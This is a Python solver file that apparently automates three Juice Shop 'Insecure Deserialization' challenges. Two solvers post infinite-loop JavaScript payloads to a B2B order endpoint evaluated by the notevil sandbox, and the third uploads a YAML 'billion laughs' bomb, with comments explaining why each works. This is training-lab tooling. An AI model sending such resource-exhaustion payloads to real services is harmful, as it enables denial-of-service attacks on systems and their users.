"""Insecure Deserialization category solvers (3 of 3). Verified against
routes/b2bOrder.ts, routes/fileUpload.ts, and the actual notevil@1.3.3 npm
package source (fetched from the registry, not guessed) on 2026-08-09.

notevil is a sandboxed JS interpreter. It walks the AST directly (no
compilation) and, for `for`/`for-in`/`while` loop nodes specifically, checks
an internal iteration counter against a hardcoded maxIterations=1000000 on
every pass, throwing "Infinite loop detected - reached max iterations" the
moment it's exceeded. That check does NOT apply to non-loop constructs (e.g.
recursive function calls). Separately, the vm.runInContext() call wrapping
safeEval() has its own 2000ms wall-clock timeout, independent of notevil's
counter.

rceChallenge wants notevil's own counter to fire FIRST (a lightweight,
empty-bodied loop reaches 1,000,000 iterations well under 2 seconds).
rceOccupyChallenge wants the 2-second VM timeout to fire INSTEAD (a loop
whose body does enough work per outer iteration that even far fewer than
1,000,000 outer passes exceeds 2 seconds, so the VM timeout wins the race
before notevil's own counter ever gets that high). Both payloads are
starting points reasoned from source, not guaranteed timings — see the
plan's Step 4 for what to check live before assuming either one is
misbehaving."""
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


@register("rceChallenge", "Insecure Deserialization", 5)
def solve_rce(ctx: SolverContext) -> None:
    email = f"rce.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/b2b/v2/orders", json={"cid": "test", "orderLinesData": "while(true){}"}, timeout=10)


@register("rceOccupyChallenge", "Insecure Deserialization", 6)
def solve_rce_occupy(ctx: SolverContext) -> None:
    email = f"rceoccupy.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/b2b/v2/orders",
        json={"cid": "test", "orderLinesData": "while(true){for(var i=0;i<1000000;i++){}}"},
        timeout=10,
    )


# --- routes/fileUpload.ts handleYamlUpload: the uploaded text is parsed by
# the YAML loader inside a 2000ms vm timeout, then the result is
# JSON-stringified. A classic YAML "billion laughs" — nested anchors and
# aliases exploding combinatorially — makes either the loader itself or
# the subsequent stringify step blow up, and the route treats BOTH
# resulting error messages ("Invalid string length" from stringify, or
# "Script execution timed out" from the vm) as a solve, which makes this
# one meaningfully less timing-fragile than the two RCE solvers above —
# either failure mode wins. ---

YAML_BOMB = """\
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
"""


@register("yamlBombChallenge", "Insecure Deserialization", 5)
def solve_yaml_bomb(ctx: SolverContext) -> None:
    email = f"yamlbomb.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/file-upload", files={"file": ("bomb.yml", YAML_BOMB.encode(), "application/x-yaml")})
